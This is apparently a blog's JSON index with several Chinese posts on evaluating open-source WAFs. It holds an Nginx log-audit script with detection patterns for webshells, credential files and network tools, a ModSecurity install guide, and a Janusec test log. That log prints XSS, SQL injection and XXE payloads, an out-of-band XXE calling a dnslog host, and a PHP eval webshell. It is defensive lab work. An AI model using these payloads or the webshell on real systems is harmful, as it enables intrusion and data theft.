&quot;&#x2F;_cat&#x2F;|&#x2F;_config&#x2F;|include&#x3D;|phpinfo|info\\.php|&#x2F;web-console|JMXInvokerServlet|&#x2F;manager&#x2F;html|axis2-admin|axis2-web|phpMyAdmin|phpmyadmin|&#x2F;admin-console|&#x2F;jmx-console|&#x2F;console&#x2F;|\\.tar.gz|\\.tar|\\.tar.xz|\\.xz|\\.zip|\\.rar|\\.mdb|\\.inc|\\.sql|&#x2F;\\.config\\b|\\.bak|&#x2F;.svn&#x2F;|&#x2F;\\.git&#x2F;|\\.hg|\\.DS_Store|\\.htaccess|nginx\\.conf|\\.bash_history|&#x2F;CVS&#x2F;|\\.bak|wwwroot|备份|&#x2F;Web.config|&#x2F;web.config|&#x2F;1.txt|&#x2F;test.txt&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;dir.log\nawk &#39;&#123;print &quot;共检测到针对敏感文件扫描&quot; NR&quot;次&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;dir.log | tail -n1\necho &quot;敏感文件访问流量 TOP 20&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;dir.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;dir_top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]漏洞利用检测\\e[00m&quot;\nag -a &quot;%00|&#x2F;win.ini|&#x2F;my.ini|\\.\\.&#x2F;\\.\\.&#x2F;|&#x2F;etc&#x2F;shadow|%0D%0A|file:&#x2F;|gopher:&#x2F;|dict:&#x2F;|WindowsPowerShell|&#x2F;wls-wsat&#x2F;|call_user_func_array|uddiexplorer|@DEFAULT_MEMBER_ACCESS|@java\\.lang\\.Runtime|OgnlContext|&#x2F;bin&#x2F;bash|cmd\\.exe|wget\\s|curl\\s|s&#x3D;&#x2F;index&#x2F;\\think&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;exploit.log\nawk &#39;&#123;print &quot;漏洞利用探测&quot; NR&quot;次&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;exploit.log | tail -n1\necho &quot;漏洞利用检测 TOP 20&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;exploit.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;exploit_top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]webshell\\e[00m&quot;\nag -a &quot;&#x3D;whoami|dbname&#x3D;|exec&#x3D;|cmd&#x3D;|\\br57\\b|\\bc99\\b|\\bc100\\b|\\bb374k\\b|adminer.php|eval\\(|assert\\(|%eval|%execute|tunnel\\.[asp|php|jsp|aspx]&#123;3,4&#125;|makewebtaski|ma\\.[asp|php|jsp|aspx]&#123;3,4&#125;|\\bup\\.[asp|php|jsp|aspx]&#123;3,4&#125;|cmd\\.[asp|php|jsp|aspx]&#123;3,4&#125;|201\\d\\.[asp|php|jsp|aspx]&#123;3,4&#125;|xiaoma\\.[asp|php|jsp|aspx]&#123;3,4&#125;|shell\\.[asp|php|jsp|aspx]&#123;3,4&#125;|404\\.[asp|php|jsp|aspx]&#123;3,4&#125;|tom\\.[asp|php|jsp|aspx]&#123;3,4&#125;|k8cmd\\.[asp|php|jsp|aspx]&#123;3,4&#125;|ver[0-9]&#123;3,4&#125;\\.[asp|php|jsp|aspx]&#123;3,4&#125;|\\.aar|[asp|php|jsp|aspx]&#123;3,4&#125;spy\\.|o&#x3D;vLogin|aioshell|admine|ghost\\.[asp|php|jsp|aspx]&#123;3,4&#125;|r00ts|90sec|t00ls|editor\\.aspx|wso\\.[asp|aspx]&#123;3,4&#125;&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;webshell.log\nawk &#39;&#123;print &quot;共检测到webshell行为&quot; NR &quot;次&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;webshell.log | tail -n1\necho &quot;Webshell TOP 20&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;webshell.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;webshell_top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]HTTP Tunnel\\e[00m&quot;\n#Regeorg代理特征\nag -a &quot;cmd&#x3D;disconnect|cmd&#x3D;read|cmd&#x3D;forward|cmd&#x3D;connect|127.0.0.1&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; | tee -a $&#123;outfile&#125;&#x2F;tunnel.log\nawk &#39;&#123;print &quot;共检测到隧道行为&quot; NR &quot;次&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;tunnel.log | tail -n1\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]Top 20 url响应长度\\e[00m&quot;\n# 查找url响应长度最长的url排序，目的是有没有下载服务器的一些打包文件\nlen&#x3D;$(cat $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;&#123;print $10&#125;&#39; | sort -nr | head -n 20)\necho $len | awk &#39;BEGIN&#123; RS&#x3D;&quot; &quot; &#125;&#123; print $0 &#125;&#39; | xargs -i&#123;&#125; ag -a --nocolor &#39;\\d+\\s&#123;&#125;\\s&#39; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;&#123;print $7,$10&#125;&#39; | sort | uniq | sort -k 2 -nr | tee -a $&#123;outfile&#125;&#x2F;url_rsp_len.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]罕见的脚本文件访问\\e[00m&quot;\necho &quot;访问量特别特别少的脚本文件极有可能是webshell&quot;\ncat $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $7&#125;&#39; | sort | uniq -c | sort -n | ag -v &#39;\\?&#39; | ag &#39;\\.php|\\.jsp|\\.asp|\\.aspx&#39; | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;rare_url.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]302跳转\\e[00m&quot;\necho &quot;此目的是寻找一些登录成功的脚本文件&quot;\ncat $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;302)||($9&#x3D;&#x3D;301) &#123;print $7&#125;&#39; | sort | uniq -c | sort -n | ag -v &#39;\\?&#39; | ag &#39;\\.php|\\.jsp|\\.asp|\\.aspx&#39; | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;302_goto.log\necho -e &quot;\\n&quot;\n","slug":"Nginx-log-check检测工具","date":"2022-06-15T14:30:16.000Z","categories_index":"开源WAF产品选型","tags_index":"日志分析,应急响应,Nginx,开源WAF产品选型,安全建设","author_index":"Moses"},{"id":"35772fd534664d45a9bf135dc04685bc","title":"开源WAF调研之产品选型-Nginx+ModSecurity3.0","content":"产品信息简介\n\n\n名称\n开源协议\n开发语言\n开源时间\n活跃度\n代码质量\n最新版本\n厂商\n\n\n\nModSecurity\nBSD 3-Clause License\nLua\n2013-12-16（2.7.6）\n5.4K⭐️\nA\n2022-05-31 （3.1.7）\nTrustwave\n\n\nModSecurity介绍ModSecurity是一个开源的、生产级别的WAF产品，核心组成部分是“规则引擎”和“规则集”，两者的关系有点像杀毒引擎和病毒特征库。\n\n规则引擎：实现了自定义的”SecRule”语言，有自己特定的语法。但“SecRule”主要基于正则表达式，还是不够灵活，所以后来引入了Lua,实现了脚本化配置。ModSecurity的规则引擎使用C++11实现，可以从GitHub上下载，然后集成进Nginx。因为他比较庞大，编译很费时间，所以最好编译成动态模块，在配置文件中用指令load_module加载\nload_module modules&#x2F;ngx_http_mod\n\n规则集：ModSecurity 源码提供一个基本的规则配置文件“modsecurity.conf-recommended”，使用前要把它的后缀改成“conf”。有了规则集，就可以在 Nginx 配置文件里加载，然后启动规则引擎：modsecurity on;modsecurity_rules_file /path/to/modsecurity.conf;“modsecurity.conf”文件默认只有检测功能，不提供入侵阻断，这是为了防止误杀误报，把“SecRuleEngine”后面改成“On”就可以开启完全的防护：#SecRuleEngine DetectionOnlySecRuleEngine On除了基本的规则集之外，ModSecurity 还额外提供一个更完善的规则集，为网站提供全面可靠的保护。这个规则集的全名叫“OWASP ModSecurity 核心规则集”CRS\n\n\n功能\n兼容 ModSecurity (opens new window)。此功能仅限最新的 Current 版本。\nSQL 注入防护（Powered By libinjection (opens new window)）。\nXSS 攻击防护（Powered By libinjection (opens new window)）。\n支持 IPV4 和 IPV6。\n支持开启验证码（CAPTCHA)，支持 hCaptcha (opens new window)、reCAPTCHAv2 (opens new window)和 reCAPTCHAv3 (opens new window)。\n支持识别友好爬虫（如 BaiduSpider）并自动放行（基于 User-Agent 和 IP 的识别）。此功能仅限最新的 Current 版本。\nCC 防御，超出限制后自动拉黑对应 IP 一段时间或者使用验证码做人机识别。\nIP 黑白名单，同时支持类似 192.168.0.0/16 和 fe80::/10，即支持点分十进制和冒号十六进制表示法和网段划分。\nPOST 黑名单。\nURL 黑白名单\n查询字符串（Query String）黑名单。\nUserAgent 黑名单。\nCookie 黑名单。\nReferer 黑白名单。\n\nModSecurity功能\nSQL Injection (SQLi)：阻止SQL注入\nCross Site Scripting (XSS)：阻止跨站脚本攻击\nLocal File Inclusion (LFI)：阻止利用本地文件包含漏洞进行攻击\nRemote File Inclusione(RFI)：阻止利用远程文件包含漏洞进行攻击\nRemote Code Execution (RCE)：阻止利用远程命令执行漏洞进行攻击\nPHP Code Injectiod：阻止PHP代码注入\nHTTP Protocol Violations：阻止违反HTTP协议的恶意访问\nHTTPoxy：阻止利用远程代理感染漏洞进行攻击\nshellshock：阻止利用Shellshock漏洞进行攻击\nSession Fixation：阻止利用Session会话ID不变的漏洞进行攻击\nScanner Detection：阻止黑客扫描网站\nMetadata&#x2F;Error Leakages：阻止源代码&#x2F;错误信息泄露\nProject Honey Pot Blacklist：蜜罐项目黑名单\nGeoIP Country Blocking：根据判断IP地址归属地来进行IP阻断\n\n准备环境\n操作系统：CentOS-7-x86_64-DVD-1810.iso\nModSecurity：3.0\nNginx：1.16.1\n虚拟机：vwareFusion12.2.1 桥接\n\n安装操作系统依赖yum install -y git wget epel-release\nyum install -y gcc-c++ flex bison yajl yajl-devel curl-devel curl GeoIP-devel doxygen zlib-devel pcre-devel lmdb-devel libxml2-devel ssdeep-devel lua-devel libtool autoconf automake\n安装ModSecuritycd &#x2F;usr&#x2F;local\ngit clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity\ncd ModSecurity\ngit checkout -b v3&#x2F;master origin&#x2F;v3&#x2F;master\ngit submodule init\ngit submodule update\nsh build.sh\n.&#x2F;configure\n# 输出\nModSecurity - v3.0.7-1-g9755088 for Linux\n\n Mandatory dependencies\n   + libInjection                                  ....v3.9.2-46-gbfba51f\n   + SecLang tests                                 ....a3d4405\n\n Optional dependencies\n   + GeoIP&#x2F;MaxMind                                 ....found\n      * (GeoIP) v1.5.0\n         -lGeoIP  , -I&#x2F;usr&#x2F;include&#x2F;\n   + LibCURL                                       ....found v7.29.0\n      -lcurl  ,  -DWITH_CURL\n   + YAJL                                          ....found v2.0.4\n      -lyajl  , -DWITH_YAJL\n   + LMDB                                          ....disabled\n   + LibXML2                                       ....found v2.9.1\n      -lxml2 -lz -lm -ldl, -I&#x2F;usr&#x2F;include&#x2F;libxml2 -DWITH_LIBXML2\n   + SSDEEP                                        ....found\n      -lfuzzy -L&#x2F;usr&#x2F;lib64&#x2F;, -DWITH_SSDEEP -I&#x2F;usr&#x2F;include\n   + LUA                                           ....found v501\n      -llua-5.1 -L&#x2F;usr&#x2F;lib64&#x2F;, -DWITH_LUA -DWITH_LUA_5_1 -I&#x2F;usr&#x2F;include\n   + PCRE2                                          ....not found\n\n Other Options\n   + Test Utilities                                ....enabled\n   + SecDebugLog                                   ....enabled\n   + afl fuzzer                                    ....disabled\n   + library examples                              ....enabled\n   + Building parser                               ....disabled\n   + Treating pm operations as critical section    ....disabled\nmake\nmake install\n安装Nginx与ModSecurity-nginxcd &#x2F;usr&#x2F;local\ngit clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity-nginx\nwget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.16.1.tar.gz\ntar -xvzf nginx-1.16.1.tar.gz\ncd &#x2F;usr&#x2F;local&#x2F;nginx-1.16.1\n.&#x2F;configure --add-module&#x3D;&#x2F;usr&#x2F;local&#x2F;ModSecurity-nginx\nmake\nmake install\n\n验证启动Nginx\n&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx\n验证Nginx服务\n[root@localhost sbin]# curl -i http:&#x2F;&#x2F;127.0.0.1\nHTTP&#x2F;1.1 200 OK\nServer: nginx&#x2F;1.16.1\nDate: Thu, 09 Jun 2022 08:24:59 GMT\nContent-Type: text&#x2F;html\nContent-Length: 612\nLast-Modified: Thu, 09 Jun 2022 08:23:04 GMT\nConnection: keep-alive\nETag: &quot;62a1ade8-264&quot;\nAccept-Ranges: bytes\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Welcome to nginx!&lt;&#x2F;title&gt;\n&lt;style&gt;\n    body &#123;\n        width: 35em;\n        margin: 0 auto;\n        font-family: Tahoma, Verdana, Arial, sans-serif;\n    &#125;\n&lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;h1&gt;Welcome to nginx!&lt;&#x2F;h1&gt;\n&lt;p&gt;If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.&lt;&#x2F;p&gt;\n\n&lt;p&gt;For online documentation and support please refer to\n&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;nginx.org&#x2F;&quot;&gt;nginx.org&lt;&#x2F;a&gt;.&lt;br&#x2F;&gt;\nCommercial support is available at\n&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;nginx.com&#x2F;&quot;&gt;nginx.com&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;\n\n&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\nPS：浏览器访问失败，临时关闭防火墙验证\n[root@localhost sbin] systemctl stop firewalld.service\n浏览器访问\n配置\n创建用于存放配置的文件夹[root@localhost conf]# mkdir &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity\n复制并重命名配置文件[root@localhost conf] cp &#x2F;usr&#x2F;local&#x2F;ModSecurity&#x2F;modsecurity.conf-recommended &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;\n# 重命名配置文件\n[root@localhost] cd &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F; &amp;&amp; rename modsecurity.conf-recommended modsecurity.conf *\n[root@localhost modsecurity] cp &#x2F;usr&#x2F;local&#x2F;ModSecurity&#x2F;unicode.mapping &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;\n下载规则文件压缩包# 下载规则包\n[root@localhost local] wget http:&#x2F;&#x2F;www.modsecurity.cn&#x2F;download&#x2F;corerule&#x2F;owasp-modsecurity-crs-3.3-dev.zip\n# 解压\n[root@localhost local] unzip owasp-modsecurity-crs-3.3-dev.zip\n# 复制crs-setup.conf.example\n[root@localhost owasp-modsecurity-crs-3.3-dev] cp crs-setup.conf.example &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;\n# 重命名文件\n[root@localhost] cd &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F; &amp;&amp; rename modsecurity.conf.example crs-setup.conf *\n# 复制rule文件夹\n[root@localhost owasp-modsecurity-crs-3.3-dev] cp -r rules &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;\n# 修改文件名,可以将自己写的规则放在999 900这两个文件中\n[root@localhost rules] rename RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf *\n[root@localhost rules] rename REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf *\n编辑nginx.conf在http或server节点中添加以下内容在http节点添加表示全局配置，在server节点添加表示为指定网站配置：modsecurity on;\nmodsecurity_rules_file &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;modsecurity.conf;\n编辑modsecurity.confvim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;modsecurity.conf\n# SecRuleEngine DetectionOnly改为SecRuleEngine On\n# 添加一下内容\nInclude &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;crs-setup.conf\nInclude &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;modsecurity&#x2F;rules&#x2F;*.conf\n重新加载Nginx&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload\n模拟攻击测试 http://nginx.test/?param=%22%3E%3Cscript%3Ealert(1);%3C/script%3E\n\n进阶Nginx基于IP的安全防护策略由于虚拟机部署的Nginx，Nginx访问日志IP为虚拟机网关IP172.16.244.1\nNginx获取真实源IPtodo\nNginx禁止国外IP测试挂代理访问不经过互联网，日志只记录虚拟机网关IP。局域网访问不到虚拟机IP。TODO\n\n 通过colab创建VPS部署Nginx ✅ 2022-06-10 💀行不通\n\nSSH VNCFailed to download https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz · Issue #31 · hackingguy/Bug-Hunting-Colab · GitHub\nChrome Remote DesktopGoogle Colab常见问题Colab 中的资源将优先提供给交互式用例。我们禁止各种涉及批量计算、会对他人造成负面影响，或试图规避我们的政策的操作。Colab 运行时中不允许执行下列操作：\n\n文件托管、媒体传送或提供其他与 Colab 的交互式计算无关的网络服务\n下载种子文件或进行点对点文件共享\n使用远程桌面或 SSH\n连接到远程代理\n加密货币挖矿\n运行拒绝服务攻击\n破解密码\n利用多个帐号绕过访问权限或资源使用情况限制\n创建深度伪造内容\n\nYouTube参考视频\n创建DEMO应用[[RASP-JRASP#0x06测试用例]]\n","slug":"开源WAF选型-Nginx+ModSecurity3.0","date":"2022-06-09T06:39:16.000Z","categories_index":"开源WAF产品选型","tags_index":"WAF,Nginx,开源WAF产品选型,安全建设,ModSecurity","author_index":"Moses"},{"id":"46d38e362d8b157bea9e251631b6d0f7","title":"开源WAF调研之产品选型-Janusec","content":"产品信息简介\n\n\n名称\n开源协议\n开发语言\n开源时间\n活跃度\n代码质量\n最新版本\n厂商\n\n\n\nJanusec\nGNU AGPLv3\nGo\n2021-04-5（1.0.0）\n923⭐️\n\n2022-04-03 （1.2.9）\n个人开发者\n\n\n产品描述Janusec应用网关，一种适用于各种场景（公有云、私有云、传统IDC等）的应用安全解决方案，提供WAF（Web应用防火墙）、CC防护、身份认证、安全运维、Web路由、负载均衡、自动化证书等功能，可用于构建安全的、可扩展的应用。\n功能\nWAF (Web Application Firewall, Web应用防火墙，天然支持HTTPS且不需要Agent )\nCC防护（多道防线）\n统一的Web化管理\n证书加密保护\n负载均衡（可扩展的部署架构）\nSQL注入\n跨站脚本\n敏感数据泄露\nCC攻击\n阻断（Block）、验证码（Captcha）等多种策略\n支持多个检查点的组合策略\n\n让管理更简单\n统一的Web化管理中心\n\n架构可扩展\n多网关节点支持\n自动化策略同步\n\n证书保护\n私钥加密存储\n只在内存使用\n\n安装quick-start docker\ndownload imagesdocker pull registry.cn-shenzhen.aliyuncs.com&#x2F;janusec&#x2F;janusec:1.2.3\n# 测试容器版本1.2.3 最新版本为1.2.9\nrundocker run -d --privileged&#x3D;true --restart&#x3D;always -p 80:80 -p 443:443 -p 9080:9080 -p 9443:9443 registry.cn-shenzhen.aliyuncs.com&#x2F;janusec&#x2F;janusec:1.2.3 &#x2F;sbin&#x2F;init\n修改测试域名使用[[开发测试工具-SwitchHosts]]添加测试域名#WAF-test\n10.9.95.230 waf.com\n修改密码初始用户密码：\n\n\nadmin \nJ@nusec123 （登录后会提示修改）\n\n\n使用参见文档介绍\n\n主机部署需求\n\n\n节点\n操作系统\n数据库\n\n\n\n主节点\nDebian 9&#x2F;10&#x2F;11+, CentOS&#x2F;RHEL 7&#x2F;8+, 首选Debian 10, x86_64, 使用 systemd和nftables\nPostgreSQL 10&#x2F;11&#x2F;12+\n\n\n副本节点\nDebian 9&#x2F;10&#x2F;11+, CentOS&#x2F;RHEL 7&#x2F;8+, 首选Debian 10, x86_64, 使用 systemd和nftables\n不需要\n\n\n准备主机防火墙nftablesnftables用于拦截CC攻击，减轻应用网关压力。CentOS 7默认没有安装nftables，需要手工安装并启动：\nyum -y install nftables  \nsystemctl enable nftables  \nsystemctl start nftables\n# 查看规则\nnft list ruleset\n下载cd ~  \nwget &#96;https:&#x2F;&#x2F;www.janusec.com&#x2F;download&#x2F;janusec-1.2.9-amd64.tar.gz&#96;  tar zxf .&#x2F;janusec-1.2.9-amd64.tar.gz\n安装请切换到root用户并运行 install.sh , janusec应用网关将安装在目录： /usr/local/janusec/\nsu  \ncd janusec-1.2.x-amd64  \n.&#x2F;install.sh\n选择 1. Primary Node, 然后安装程序会:\n\n将所需文件复制到 /usr/local/janusec/\n将服务配置文件复制到系统服务目录\n将Janusec应用网关服务设置为自动启动，但首次安装时不会启动，需要在配置完成后手工启动一次.\n\n配置PostgreSQL没有包含在发布包中，需要自行准备PostgreSQL数据库、数据库、账号，可参考运维管理中的PostgreSQL安装。现在我们假设您已经安装好了PostgreSQL，且数据库已创建，用户名和口令已准备好。然后编辑 /usr/local/janusec/config.json :\n主节点 (第一个节点，必选)可参考配置文件说明，其中：\n“node_role”: “primary” ( 固定为 &#96;primary&#96; )\n副本节点(可选)通常多个小型应用只使用一个主节点就够了。当流量增长后，可使用副本节点扩展，需要配合您自己的GSLB（全球服务器负载均衡）或支持分区解析的DNS来实现（也就是说，不同地区的用户，会连接到不同的网关节点）。\n可参考配置文件说明，其中:\n\n\n\n\n\n\n\n\n\n“node_role”: “replica” ( 固定为 replica )\n并配置”replica_node”中的内容:\n\n\n\n\n\n\n\n\n\n“node_key”: “从管理后台节点管理中复制过来”,“sync_addr”: “https://gateway.primary_node.com:9443&#x2F;janusec-admin&#x2F;api”\n说明：\n\n如果使用了副本节点，请为主节点单独申请一个域名(例如gateway.primary_node.com，用于副本节点获取配置更新，该域名只指向主节点)，并且配置一个应用(Application)，Destination可配置为127.0.0.1:9999 （实际不使用）。\n如果”primary_node” - “admin” - “listen” 为false，“sync_addr”中请勿包含冒号和端口号，如”https://gateway.primary_node.com/janusec-admin/api”\n\n启动systemctl start janusec\n测试安装打开浏览器（比如Chrome）,使用如下地址：\n在config.json中，如果 “primary_node” - “admin” - “listen” 为false，则管理入口为：\n\n\n\n\n\n\n\n\n\nhttp:&#x2F;&#x2F;您的网关IP地址&#x2F;janusec-admin&#x2F; ， 这是Janusec应用网关的第一个管理地址https:&#x2F;&#x2F;您的任意应用域名&#x2F;janusec-admin&#x2F; (在配置证书和应用之后可以使用)\n如果 “primary_node” - “admin” - “listen” 为true，则默认管理入口为：\n\n\n\n\n\n\n\n\n\nhttp:&#x2F;&#x2F;您的网关IP地址:9080&#x2F;janusec-admin&#x2F; ， 这是Janusec应用网关的第一个管理地址https:&#x2F;&#x2F;您的任意应用域名:9443&#x2F;janusec-admin&#x2F; (在配置证书和应用之后可以使用)\n默认用户名：admin默认口令：J@nusec123\n高可用部署附录3: 高可用配置\n使用&amp;测试应用配置使用pikachu靶场作为后端服务进行测试\n测试1.目录扫描使用OWASP DirBuster 0.12 进行目录暴力破解，Janusec未拦截，dashboard为显示漏洞攻击告警\n2.XSS注入-手动测试反射型XSS-get\n出入框中测试&lt;&gt;Jordan验证是&lt;&gt;是否会被过滤掉如图即使经过WAF，输入的查询内容依然原封不动的输出到标签中，可以一进步测试。测试JS代码&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;\n注意：前端对输入长度进行了限制，需要修改前端标签的长度限制进行绕过绕过WAF直接请求后端服务经过WAF请求结果命中Policy ID 10114 Basic XSS Tags策略\n\nPolicy ID 10115 Basic XSS Functions**Policy ID 10116 Basic XSS Event **\n存储型xss💀浏览版输入&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;成功弹窗，WAF失效\nCC防护测试存储型XSS，反复删除留言板时出发CC防护策略\n3.SQL注入-手工字符型注入-get输入kobe&#39; or 1=1#经过WAF 命中 Policy ID: 10106\n搜索型注入输入k%&#39; or 1=1#经过WAF命中Policy ID: 10102\nXX型注入输入kobe&#39;) or 1=1#经过WAF命中Policy ID: 10106\n4.RCE输入phpinfo();经过WAF命中webshell Policy ID: 10112\n5.XXE💀输入palyload,经过WAF为被阻断，失败\n&lt;?xml version &#x3D; &quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [     &lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt; ]&gt; &lt;x&gt;&amp;f;&lt;&#x2F;x&gt;\n\nXXE带外测试失败💀输入\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;a5kps8.dnslog.cn&quot; &gt;\n]&gt;\n&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;\n\n6.文件上传-webshell客户端check绕过前端限制，删除onchange=&quot;checkFileExt(this.value)&quot;上传PHP webshell成功\n&lt;?php\neval($_POST[&quot;pass&quot;]);\n经过WAF被banner\n7.OWASP Top 10使用OWASP ZAP 2.11.1测试** 测试项及结果**\n\n\n\n\n强度\n进展\nElapsed\nReqs\n警报\n状态\n\n\n\n分析仪\n\n\n00:00.216\n36\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlugin\n\n\n\n\n\n\n\n\nPath Traversal\n中等的\n100\n09:38.184\n159\n0\n完成\n\n\n远程文件包含\n中等的\n100\n08:49.120\n80\n0\n完成\n\n\nSource Code Disclosure - &#x2F;WEB-INF folder\n中等的\n100\n00:01.608\n7\n0\n完成\n\n\nExternal Redirect\n中等的\n100\n18:48.339\n172\n1\n完成\n\n\nServer Side Include\n中等的\n100\n08:39.117\n102\n0\n完成\n\n\nCross Site Scripting (Reflected)\n中等的\n100\n04:19.813\n137\n0\n完成\n\n\nCross Site Scripting (Persistent) - Prime\n中等的\n100\n01:19.335\n29\n0\n完成\n\n\nCross Site Scripting (Persistent) - Spider\n中等的\n100\n02:04.693\n184\n0\n完成\n\n\nCross Site Scripting (Persistent)\n中等的\n100\n00:30.836\n0\n0\n完成\n\n\nSQL Injection\n中等的\n100\n09:39.681\n97\n0\n完成\n\n\nServer Side Code Injection\n中等的\n100\n04:33.695\n74\n1\n完成\n\n\nRemote OS Command Injection\n中等的\n100\n15:10.048\n147\n1\n完成\n\n\nDirectory Browsing\n中等的\n100\n02:02.420\n185\n32\n完成\n\n\n缓冲区溢出\n中等的\n100\n00:19.764\n31\n0\n完成\n\n\n格式字符串错误\n中等的\n100\n03:33.630\n65\n0\n完成\n\n\nCRLF Injection\n中等的\n100\n17:50.856\n169\n0\n完成\n\n\nParameter Tampering\n中等的\n100\n09:14.914\n74\n0\n完成\n\n\nELMAH信息泄漏\n中等的\n100\n00:20.010\n0\n0\n完成\n\n\n.htaccess Information Leak\n中等的\n100\n00:34.186\n35\n0\n完成\n\n\nScript Active Scan Rules\n中等的\n100\n00:00.000\n0\n0\n跳过，未启用任何脚本\n\n\n跨站点脚本（基于DOM）\n中等的\n100\n00:05.864\n0\n0\n跳过，启动或连接浏览器失败\n\n\nSOAP Action Spoofing\n中等的\n100\n00:00.503\n0\n0\n完成\n\n\nSOAP XML Injection\n中等的\n100\n00:19.623\n0\n0\n完成\n\n\n\n\n\n\n\n\n\n\n\n总计\n\n\n117:34.853\n2298\n35\n\n\n\nWAF dashboard显示结果\n","slug":"开源WAF选型-Janusec","date":"2022-06-08T05:58:01.418Z","categories_index":"开源WAF产品选型","tags_index":"WAF,Nginx,开源WAF产品选型,安全建设,Kong网关","author_index":"Moses"},{"id":"63a5a11a14a315d8cefd93c2d8cf4b9d","title":"开源WAF调研之产品选型-Coraza","content":"产品信息简介\n\n\n名称\n开源协议\n开发语言\n开源时间\n活跃度\n代码质量\n最新版本\n厂商\n\n\n\ncoraza\nOpen-source Apache 2 Licensed\ngo\n2021-09-02（1.0.0）\n518⭐️\nA\n2022-03-31 